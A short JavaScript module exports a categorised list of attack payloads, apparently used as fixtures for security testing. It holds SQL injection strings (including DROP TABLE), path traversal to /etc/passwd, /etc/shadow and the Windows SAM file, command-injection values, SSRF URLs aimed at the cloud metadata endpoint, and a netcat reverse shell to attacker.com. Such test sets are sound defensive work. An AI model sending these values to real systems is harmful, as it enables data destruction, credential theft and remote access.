export const ATTACK_PAYLOADS = {
    sqlInjection: [
        "test');--", 
        "' OR 1=1 --", 
        "; DROP TABLE records; --",
        "Robert'); DROP TABLE records;--", 
        "' UNION SELECT 1, 'pwned', 'pwned'--",
        "admin' #", 
        "' OR '' = '", 
        "test', 'malicious');--"
    ],
    fileAccess: [
        "../../../etc/passwd", 
        "..\\..\\windows\\system32\\config\\sam",
        "/proc/version", 
        "../../../../etc/shadow", 
        "..\\..\\..\\boot.ini"
    ],
    commandExecution: [
        "ls; cat /etc/passwd", 
        "dir & type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "whoami && id", 
        "uname -a; ps aux", 
        "nc -e /bin/sh attacker.com 4444"
    ],
    networkAttacks: [
        "http://localhost:22", 
        "http://169.254.169.254/metadata",
        "file:///etc/passwd", 
        "http://internal.service:8080", 
        "gopher://127.0.0.1:25"
    ],
    envExposure: [
        "SECRET_KEY", "PATH", "USER", "HOME", "TEMP", "AWS_ACCESS_KEY_ID",
        "DATABASE_URL", "API_KEY", "PRIVATE_KEY", "SESSION_SECRET"
    ],
    cryptoWeaknesses: [
        "md5", 
        "sha1"
    ]
};
